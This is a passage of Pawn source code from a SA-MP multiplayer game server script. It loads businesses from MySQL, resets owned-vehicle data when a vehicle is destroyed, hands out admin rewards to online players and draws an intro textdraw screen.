        BizzInfo[i][bForosh] = cache_get_row_int(i,20,handle);
    }
    for(new h = 0; h < sizeof(BizzInfo); h++)
    {
        if(BizzInfo[h][bOwned] == 0)
        {
            CreatePickup(1239, 1, BizzInfo[h][bEntranceX], BizzInfo[h][bEntranceY], BizzInfo[h][bEntranceZ],0);
            pickups++;
        }
        if(BizzInfo[h][bOwned] == 1)
        {
            CreatePickup(1239, 1, BizzInfo[h][bEntranceX], BizzInfo[h][bEntranceY], BizzInfo[h][bEntranceZ],0);
            pickups++;
        }
        bizer[h] = CreateDynamic3DTextLabel("Loading Bizes ...",COLOR_BIZ,BizzInfo[h][bEntranceX], BizzInfo[h][bEntranceY], BizzInfo[h][bEntranceZ],10.0);
    }
    CreatePickup(1239, 1 ,757.5751,5.6157,1000.7015,BizzInfo[7][bVW]);//gym fightstyle
    CreatePickup(1239, 1, 323.507873,1117.880981,1083.882812,BizzInfo[28][bVW]);//getjob drugs dealer
    //CreatePickup(1239, 1, -787.565551,500.073822,1371.742187,BizzInfo[2][bVW]);//eat place resturant LS
    print("\n- All Bussineses Loaded.");
    return 1;
}

public LoadSBizz()
{
    print("+ Loading Special Bussineses");
    mysql_function_query(handle,"SELECT * FROM `specialbizzes`",true,"OnSbizzLoad","");
    return 1;
}
forward OnSbizzLoad();
public OnSbizzLoad()
{
    for(new i = 0;i<cache_get_row_count(handle); i++)
    {
        SBizzInfo[i][sbSQLid] = i;
        SBizzInfo[i][sbOwned] = cache_get_row_int(i,1,handle);
        cache_get_row(i,2,SBizzInfo[i][sbOwner],handle,64);
        cache_get_row(i,3,SBizzInfo[i][sbMessage],handle,128);
        SBizzInfo[i][sbEntranceX] = cache_get_row_float(i,4,handle);
        SBizzInfo[i][sbEntranceY] = cache_get_row_float(i,5,handle);
        SBizzInfo[i][sbEntranceZ] = cache_get_row_float(i,6,handle);
        SBizzInfo[i][sbLevelNeeded] = cache_get_row_int(i,7,handle);
        SBizzInfo[i][sbBuyPrice] = cache_get_row_int(i,8,handle);
        SBizzInfo[i][sbEntranceCost] = cache_get_row_int(i,9,handle);
        SBizzInfo[i][sbTill] = cache_get_row_int(i,10,handle);
        SBizzInfo[i][sbProducts] = cache_get_row_int(i,11,handle);
        SBizzInfo[i][sbMaxProducts] = cache_get_row_int(i,12,handle);
        SBizzInfo[i][sbPriceProd] = cache_get_row_int(i,13,handle);
        SBizzInfo[i][sbForosh] = cache_get_row_int(i,14,handle);
    }
    for(new h = 0; h < sizeof(SBizzInfo); h++)
    {
        if(SBizzInfo[h][sbOwned] == 0)
        {
            CreatePickup(1239, 1, SBizzInfo[h][sbEntranceX], SBizzInfo[h][sbEntranceY], SBizzInfo[h][sbEntranceZ],0);
            pickups++;
        }
        if(SBizzInfo[h][sbOwned] == 1)
        {
            CreatePickup(1239, 1, SBizzInfo[h][sbEntranceX], SBizzInfo[h][sbEntranceY], SBizzInfo[h][sbEntranceZ],0);
            pickups++;
        }
        sbizer[h] = CreateDynamic3DTextLabel("Loading Sbizzes ...",COLOR_BIZ,SBizzInfo[h][sbEntranceX], SBizzInfo[h][sbEntranceY], SBizzInfo[h][sbEntranceZ],10.0);
    }
    print("- All Special Bussineses Loaded.");
    return 1;
}
public OnVehicleDeath(vehicleid,killerid)
{
	vHealth[vehicleid] =0.0;
    if(OwnedMashin[vehicleid] == 1)
    {
        PlayerInfo[MashinOwner[vehicleid]][cDestroyed] ++;
        SaveKonVal(MashinOwner[vehicleid], "cDestroyed", PINFO[MashinOwner[vehicleid]][cDestroyed]);
        PlayerInfo[MashinOwner[vehicleid]][cFuel] = 100;
        SaveKonVal(MashinOwner[vehicleid], "cFuel", 100);
        PlayerInfo[MashinOwner[vehicleid]][cHealth] = 1000.0;
        SaveKonFloat(MashinOwner[vehicleid], "cHealth", 1000);
        PlayerInfo[MashinOwner[vehicleid]][cMod1] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod1", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod3] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod3", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod4] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod4", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod5] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod5", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod6] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod6", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod7] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod7", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod8] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod8", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod9] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod9", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod10] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod10", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod11] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod11", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod12] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod12", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod13] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod13", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod14] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod14", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod15] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod15", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod16] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod16", 0);
        PlayerInfo[MashinOwner[vehicleid]][cMod17] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cMod17", 0);
        PlayerInfo[MashinOwner[vehicleid]][cPaintJob] = 3;
        SaveKonVal(MashinOwner[vehicleid], "cPaintJob", 3);
        PINFO[MashinOwner[vehicleid]][cPanel] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cPanel", 0);
        PINFO[MashinOwner[vehicleid]][cDoors] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cDoors", 0);
        PINFO[MashinOwner[vehicleid]][cTires] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cTires", 0);
        PINFO[MashinOwner[vehicleid]][cLights] = 0;
        SaveKonVal(MashinOwner[vehicleid], "cLights", 0);
        if(PINFO[MashinOwner[vehicleid]][cInsurance] <= 0)
        {
            PINFO[MashinOwner[vehicleid]][cFixed] = 0;
            SaveKonVal(MashinOwner[vehicleid], "cFixed", 0);
        }
        else
        {
            PINFO[MashinOwner[vehicleid]][cInsurance] --;
            SaveKonVal(MashinOwner[vehicleid], "cInsurance", PINFO[MashinOwner[vehicleid]][cInsurance]);
        }
    }
    else if(OwnedMashin_2[vehicleid] == 1)
    {
        PlayerInfo[MashinOwner_2[vehicleid]][cDestroyed_2] ++;
        SaveKonVal(MashinOwner_2[vehicleid], "cDestroyed_2", PINFO[MashinOwner_2[vehicleid]][cDestroyed_2]);
        PlayerInfo[MashinOwner_2[vehicleid]][cFuel_2] = 100;
        SaveKonVal(MashinOwner_2[vehicleid], "cFuel_2", 100);
        PlayerInfo[MashinOwner_2[vehicleid]][cHealth_2] = 1000.0;
        SaveKonFloat(MashinOwner_2[vehicleid], "cHealth_2", 1000);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod1_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod1_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod3_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod3_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod4_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod4_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod5_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod5_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod6_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod6_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod7_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod7_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod8_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod8_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod9_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod9_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod10_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod10_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod11_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod11_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod12_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod12_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod13_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod13_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod14_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod14_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod15_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod15_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod16_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod16_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cMod17_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cMod17_2", 0);
        PlayerInfo[MashinOwner_2[vehicleid]][cPaintJob_2] = 3;
        SaveKonVal(MashinOwner_2[vehicleid], "cPaintJob_2", 3);
        PINFO[MashinOwner_2[vehicleid]][cPanel_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cPanel_2", 0);
        PINFO[MashinOwner_2[vehicleid]][cDoors_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cDoors_2", 0);
        PINFO[MashinOwner_2[vehicleid]][cTires_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cTires_2", 0);
        PINFO[MashinOwner_2[vehicleid]][cLights_2] = 0;
        SaveKonVal(MashinOwner_2[vehicleid], "cLights_2", 0);
        if(PINFO[MashinOwner_2[vehicleid]][cInsurance_2] <= 0)
        {
            PINFO[MashinOwner_2[vehicleid]][cFixed_2] = 0;
            SaveKonVal(MashinOwner_2[vehicleid], "cFixed_2", 0);
        }
        else
        {
            PINFO[MashinOwner_2[vehicleid]][cInsurance_2] --;
            SaveKonVal(MashinOwner_2[vehicleid], "cInsurance_2", PINFO[MashinOwner_2[vehicleid]][cInsurance_2]);
        }
    }
    return 1;
}
public ChangeColor() {
	static tick = 0;
	tick++;
	static colors[5][5] = {"~Y~", "~B~", "~R~","~G~","~W~"};
	static first[256] = "Joker-GaminG", second[512] = "";
	new str[32];
	format(str, sizeof(str), "%s%s%s%s", colors[tick%2], first, colors[(tick%2)+2], second);
	TextDrawSetString(TD_Site1, str);
	return 1;
}

public gron(playerid)
{
	if(gr[playerid] == 0) return 1;
    new veh = GetPlayerVehicleID(playerid);
	SetVehicleHealth(veh, 200);
	SetTimerEx("gron1", 100, false, "i", playerid);
    return 1;
}


public gron1(playerid)
{
    new veh = GetPlayerVehicleID(playerid);
	SetVehicleHealth(veh, 1000);
	SetTimerEx("gron", 1, false, "i", playerid);
	return 1;
}
public TrashCharge(Trashid)
{
TrashKhalie[Trashid] == 0;
return 1;
}
public CheckPlayers() {
if(MLR == 1) {
new c = 0;
for(new i = 0;i<LastPID;i++) {
if(IsPlayerConnected(i) && gPlayerLogged[i] == 1) {

c++;

}
}
if(c >= PMLR) {
for(new i = 0;i<LastPID;i++) {
if(IsPlayerConnected(i) && gPlayerLogged[i] == 1) {
GivePlayerPool(i, MMLR);
PINFO[i][pExp] += RMLR;
PINFO[i][pLevel] += LMLR;
SaveKonVal(i, "pExp", PINFO[i][pExp]);
SaveKonVal(i, "pLevel", PINFO[i][pLevel]);
SetPlayerScore(i,PlayerInfo[i][pLevel]);
new lolstr2[512];
format(lolstr2, sizeof(lolstr2), "AdmBot Has Given %i Respect Points And %i Level And $%s To All Online Players.", RMLR, LMLR, FormatNumber(MMLR));
SendClientMessage(i, COLOR_LIGHTBLUE, lolstr2);
}
}
MLR = 0;
MMLR = 0;
RMLR = 0;
LMLR = 0;
PMLR = 0;
}
else {
SetTimer("CheckPlayers", 5000, 0);
}
}
}
forward CreateTD(playerid);
public CreateTD(playerid)
{

    IntroTD[0][playerid] = CreatePlayerTextDraw(playerid,643.000000, 290.785217, "LD_SPAC:white");
    PlayerTextDrawLetterSize(playerid,IntroTD[0][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[0][playerid], -315.666687, 158.459259);
    PlayerTextDrawAlignment(playerid,IntroTD[0][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[0][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[0][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[0][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[0][playerid], 4);

    IntroTD[1][playerid] = CreatePlayerTextDraw(playerid,0.000000, 0.000000, "LD_SPAC:white");
    PlayerTextDrawLetterSize(playerid,IntroTD[1][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[1][playerid], 40.666664, 448.000000);
    PlayerTextDrawAlignment(playerid,IntroTD[1][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[1][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[1][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[1][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[1][playerid], 4);

    IntroTD[2][playerid] = CreatePlayerTextDraw(playerid,27.666666, 0.000000, "LD_SPAC:white");
    PlayerTextDrawLetterSize(playerid,IntroTD[2][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[2][playerid], 636.333129, 59.733329);
    PlayerTextDrawAlignment(playerid,IntroTD[2][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[2][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[2][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[2][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[2][playerid], 4);

    IntroTD[3][playerid] = CreatePlayerTextDraw(playerid,612.000000, 9.955554, "LD_SPAC:white");
    PlayerTextDrawLetterSize(playerid,IntroTD[3][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[3][playerid], 53.999996, 352.177703);
    PlayerTextDrawAlignment(playerid,IntroTD[3][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[3][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[3][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[3][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[3][playerid], 4);

    IntroTD[4][playerid] = CreatePlayerTextDraw(playerid,0.333332, 396.562957, "LD_SPAC:white");
    PlayerTextDrawLetterSize(playerid,IntroTD[4][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[4][playerid], 639.666687, 51.437042);
    PlayerTextDrawAlignment(playerid,IntroTD[4][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[4][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[4][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[4][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[4][playerid], 4);

    IntroTD[5][playerid] = CreatePlayerTextDraw(playerid,334.666717, 174.807449, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[5][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[5][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[5][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[5][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[5][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[5][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[5][playerid], 4);

    IntroTD[6][playerid] = CreatePlayerTextDraw(playerid,318.333404, 245.081527, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[6][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[6][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[6][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[6][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[6][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[6][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[6][playerid], 4);

    IntroTD[7][playerid] = CreatePlayerTextDraw(playerid,200.333496, 37.014785, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[7][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[7][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[7][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[7][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[7][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[7][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[7][playerid], 4);

    IntroTD[8][playerid] = CreatePlayerTextDraw(playerid,352.333465, 101.066650, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[8][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[8][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[8][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[8][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[8][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[8][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[8][playerid], 4);

    IntroTD[9][playerid] = CreatePlayerTextDraw(playerid,490.999938, 113.511146, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[9][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[9][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[9][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[9][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[9][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[9][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[9][playerid], 4);

    IntroTD[10][playerid] = CreatePlayerTextDraw(playerid,472.666625, 186.274108, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[10][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[10][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[10][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[10][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[10][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[10][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[10][playerid], 4);

    IntroTD[11][playerid] = CreatePlayerTextDraw(playerid,463.666625, 227.511154, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[11][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[11][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[11][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[11][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[11][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[11][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[11][playerid], 4);

    IntroTD[12][playerid] = CreatePlayerTextDraw(playerid,360.333312, 17.370443, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[12][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[12][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[12][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[12][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[12][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[12][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[12][playerid], 4);

    IntroTD[13][playerid] = CreatePlayerTextDraw(playerid,348.333312, 59.022293, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[13][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[13][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[13][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[13][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[13][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[13][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[13][playerid], 4);

    IntroTD[14][playerid] = CreatePlayerTextDraw(playerid,335.333282, 111.044525, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[14][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[14][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[14][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[14][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[14][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[14][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[14][playerid], 4);

    IntroTD[15][playerid] = CreatePlayerTextDraw(playerid,322.999816, 162.237121, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[15][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[15][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[15][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[15][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[15][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[15][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[15][playerid], 4);

    IntroTD[16][playerid] = CreatePlayerTextDraw(playerid,310.999786, 215.088958, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[16][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[16][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[16][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[16][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[16][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[16][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[16][playerid], 4);

    IntroTD[17][playerid] = CreatePlayerTextDraw(playerid,298.333099, 269.600067, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[17][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[17][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[17][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[17][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[17][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[17][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[17][playerid], 4);

    IntroTD[18][playerid] = CreatePlayerTextDraw(playerid,288.666412, 317.059356, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[18][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[18][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[18][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[18][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[18][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[18][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[18][playerid], 4);

    IntroTD[19][playerid] = CreatePlayerTextDraw(playerid,180.000167, 112.681442, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[19][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[19][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[19][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[19][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[19][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[19][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[19][playerid], 4);

    IntroTD[20][playerid] = CreatePlayerTextDraw(playerid,160.333496, 184.614807, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[20][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[20][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[20][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[20][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[20][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[20][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[20][playerid], 4);

    IntroTD[21][playerid] = CreatePlayerTextDraw(playerid,422.333282, 53.511112, "LD_SPAC:white");
    PlayerTextDrawLetterSize(playerid,IntroTD[21][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[21][playerid], 240.999984, 67.614814);
    PlayerTextDrawAlignment(playerid,IntroTD[21][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[21][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[21][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[21][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[21][playerid], 4);

    IntroTD[22][playerid] = CreatePlayerTextDraw(playerid,353.999969, 94.992637, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[22][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[22][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[22][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[22][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[22][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[22][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[22][playerid], 4);

    IntroTD[23][playerid] = CreatePlayerTextDraw(playerid,495.333282, 96.748146, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[23][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[23][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[23][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[23][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[23][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[23][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[23][playerid], 4);

    IntroTD[24][playerid] = CreatePlayerTextDraw(playerid,144.000152, 246.592590, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[24][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[24][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[24][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[24][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[24][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[24][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[24][playerid], 4);

    IntroTD[25][playerid] = CreatePlayerTextDraw(playerid,126.000129, 313.133331, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[25][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[25][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[25][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[25][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[25][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[25][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[25][playerid], 4);

    IntroTD[26][playerid] = CreatePlayerTextDraw(playerid,116.666809, 345.244476, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[26][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[26][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[26][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[26][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[26][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[26][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[26][playerid], 4);

